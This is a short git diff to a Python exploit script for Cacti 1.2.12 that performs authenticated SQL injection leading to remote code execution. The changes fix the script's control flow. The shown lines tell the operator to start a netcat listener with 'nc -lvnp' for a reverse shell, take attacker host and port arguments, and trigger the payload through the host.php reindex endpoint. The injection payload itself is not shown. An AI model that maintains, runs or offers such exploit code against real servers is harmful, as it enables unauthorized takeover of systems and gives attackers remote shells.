@@ -25,6 +25,7 @@ class Cacti():
             nc_check = input("Is netcat running? y or n? ")
             if nc_check == 'y':
                 self.sql_exploit()
+                break
             elif nc_check == 'n':
                 print("Make sure netcat is running with nc -lvnp " + self.lport)
                 continue
@@ -65,7 +66,6 @@ class Cacti():
 
         payload_execute_url = self.new_url + "/cacti/host.php?action=reindex"
         payload_execute_req = session.get(payload_execute_url,verify=False)
-        exit()
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Cacti 1.2.12 - SQL Injection / Authenticated Remote Code Execution')
@@ -77,9 +77,8 @@ if __name__ == "__main__":
     parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=True)
     args = parser.parse_args()
 
-    while True:
-        try:
-            Cacti(args.t,args.u,args.p,args.lhost,args.lport)
-        except KeyboardInterrupt:
-            print("Bye Bye!")
-            exit()
+    try:
+        Cacti(args.t,args.u,args.p,args.lhost,args.lport)
+    except KeyboardInterrupt:
+        print("Bye Bye!")
+        exit()
